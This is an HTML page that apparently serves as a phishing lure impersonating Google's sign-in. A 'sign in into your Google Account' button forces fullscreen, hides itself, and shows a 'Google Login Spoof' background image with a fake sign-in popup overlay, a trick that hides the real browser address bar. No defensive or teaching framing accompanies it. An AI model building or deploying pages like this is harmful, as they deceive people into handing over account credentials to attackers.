<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL TESTING WEBVIEW</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #spoof-img {
            display: none;
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            position: absolute;
            top: 0; left: 0;
            z-index: 1;
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); /* Optional: gelapkan background */
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        #sign-img {
            max-width: 90%;
            max-height: 90%;
            object-fit: contain;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .signin-link {
            padding: 20px 40px;
            background: #4285f4;
            color: white;
            font-size: 18px;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
            z-index: 10;
        }
    </style>
    <script>
        function goFullscreen() {
            var elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
        }

        function openOverlay() {
            // Tampilkan spoof.png sebagai background
            document.getElementById('spoof-img').style.display = 'block';

            // Sembunyikan tombol setelah 1 detik
            setTimeout(() => {
                document.querySelector('.signin-link').style.display = 'none';
            }, 1000);

            // Tampilkan overlay dengan sign.png setelah 1 detik (atau langsung jika mau)
            setTimeout(() => {
                document.getElementById('overlay').style.display = 'flex';
            }, 1000);

            // Fullscreen main window (hampir selalu berhasil karena langsung dari klik)
            goFullscreen();
        }
    </script>
</head>
<body>
    <a href="#" class="signin-link" onclick="openOverlay(); return false;">
        Click here to sign in into your Google Account v2
    </a>

    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof">

    <!-- Overlay mirip popup -->
    <div id="overlay">
        <img id="sign-img" src="sign.png" alt="Sign in with Google">
    </div>
</body>
</html>
